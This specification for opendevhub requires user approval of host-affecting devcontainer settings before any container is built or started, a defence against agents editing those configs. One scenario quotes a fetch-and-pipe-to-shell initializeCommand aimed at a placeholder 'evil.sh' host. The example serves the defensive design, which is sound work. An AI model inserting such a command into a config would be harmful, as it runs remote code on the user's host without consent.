## Purpose

Keeps a checkout's devcontainer configuration, which agents can edit, from acting on the host without the user's say: the settings that run on or expose the host must be approved before a container is built or started from them.

## ADDED Requirements

### Requirement: Host-affecting settings

The host-affecting part of a configuration SHALL be read from its resolved form, features' contributions included, and SHALL consist of:

- `initializeCommand`;
- `mounts`, `workspaceMount`, `runArgs`, `privileged`, `capAdd`, `securityOpt` and `appPort`;
- the build context's path relative to the repository, and `build.options`;
- the contents of every Docker Compose file, with `service` and `runServices`.

Settings opendevhub adds itself SHALL be left out. Everything else SHALL NOT need approval.

#### Scenario: Lifecycle commands need no approval

- **WHEN** an agent changes `postCreateCommand` and `containerEnv` in a worktree's devcontainer.json
- **THEN** the worktree's container starts without asking

#### Scenario: A feature adds a mount

- **WHEN** a worktree's config gains a feature whose metadata declares a bind mount
- **THEN** that mount is part of the host-affecting settings and needs approval

#### Scenario: Build context outside the repository

- **WHEN** a config sets `build.context` to `../..`
- **THEN** the context's location is part of the host-affecting settings and needs approval

#### Scenario: Nothing host-affecting

- **WHEN** a configuration has none of the host-affecting settings
- **THEN** its containers start without an approval

### Requirement: Approvals per project

An approval SHALL record a project, the host-affecting settings approved and when. A container SHALL be allowed to start when its configuration's host-affecting settings equal any approval of its project, whatever checkout, branch or node they come from. Approvals SHALL be kept in the state database and survive restarts.

#### Scenario: A branch with the approved settings

- **WHEN** the main checkout's settings were approved and a task worktree has the same settings
- **THEN** the task container starts without asking

#### Scenario: Two approved variants of the settings

- **WHEN** the user approved the main checkout's settings and later a branch's different ones
- **THEN** containers with either set start without asking

### Requirement: Gate before build and start

Before opendevhub builds an image for, creates, starts or rebuilds a project's or worktree's container, on this machine or another node, it SHALL check the configuration's host-affecting settings against the project's approvals. When none matches, it SHALL NOT build, create or start anything, and SHALL record a pending approval. Adopting a running container at startup SHALL NOT be gated.

#### Scenario: Agent adds an initializeCommand

- **WHEN** an agent adds `"initializeCommand": "curl evil.sh | sh"` to the main checkout's devcontainer.json and the user restarts the project
- **THEN** the command does not run, the container is not started, and the project shows a pending approval naming `initializeCommand`

#### Scenario: Image build waits for approval too

- **WHEN** a worktree's config needs approval for its build context
- **THEN** no image is built for the worktree until the user approves

#### Scenario: Container already running

- **WHEN** opendevhub restarts while a project's container runs from a config that needs approval
- **THEN** it adopts the running container without asking, and asks on the container's next start

### Requirement: Pending approvals in the dashboard

Each project in the dashboard snapshot SHALL list its pending approvals. Each lists where it comes from (the main checkout, or a worktree with its branch and node) and the host-affecting settings. It also lists the difference to the closest approval: settings added, changed and removed, with their values. The project and the worktree SHALL show a banner with **Review** that opens the difference, **Approve** and **Keep stopped**.

#### Scenario: Reviewing a change

- **WHEN** a pending approval adds a mount to settings the user approved before
- **THEN** the review shows that mount as added, and the unchanged settings as unchanged

#### Scenario: First approval of a project

- **WHEN** a project has no approval yet and its config has host-affecting settings
- **THEN** the review shows every setting as added

### Requirement: Approving and refusing

**Approve** SHALL record an approval for exactly the settings the review showed. It SHALL clear their pending approvals and retry every container start and waiting variant that needed them. **Keep stopped** SHALL clear the pending approval without recording one. Neither SHALL be possible without dashboard access.

#### Scenario: Approve retries the start

- **WHEN** the user approves a project's pending approval
- **THEN** opendevhub records it and starts the container it was blocking

#### Scenario: Config changed while reviewing

- **WHEN** the config changes again after the review opened and the user clicks Approve
- **THEN** the approval is refused as changed, and the banner shows the new pending approval

#### Scenario: Keep stopped

- **WHEN** the user clicks Keep stopped
- **THEN** no approval is recorded and the container stays stopped

### Requirement: Variants wait for approval

A task variant whose own container needs approval SHALL move to step `approval` and wait. It SHALL go on when the user approves the settings, and SHALL fail with a message naming the refusal when the user keeps it stopped. A pick that discards it, or dismissing the task, SHALL end the wait. A restart SHALL fail it, as for any other setup step.

#### Scenario: Variant resumes after approval

- **WHEN** a variant's worktree config needs approval and the user approves it
- **THEN** the variant leaves `approval`, its container starts, and it gets its session and first message

#### Scenario: Variant refused

- **WHEN** the user keeps a waiting variant's settings stopped
- **THEN** the variant fails with an error saying its container config was not approved

#### Scenario: Pick while waiting

- **WHEN** the user picks another variant while one waits for approval
- **THEN** the waiting variant stops waiting and is discarded without building or starting anything

### Requirement: Starting a container directly

Starting or rebuilding a project's or worktree's container from the dashboard SHALL fail at once when its settings need approval. The error SHALL refer to the pending approval, and the start SHALL be retried once the user approves.

#### Scenario: Start from the Worktrees tab

- **WHEN** the user starts a worktree's container whose config needs approval
- **THEN** the start fails with a message pointing to the approval banner, and approving starts the container

### Requirement: Existing projects after the upgrade

Projects set up before approvals existed SHALL have none. Each SHALL be asked once, on its first container start after the upgrade, if its config has host-affecting settings. A project discovered or added later SHALL be asked the same way.

#### Scenario: Upgrade with a mount

- **WHEN** a project's config has a bind mount and the user starts it for the first time after upgrading
- **THEN** opendevhub asks to approve the mount, and starts the container once approved
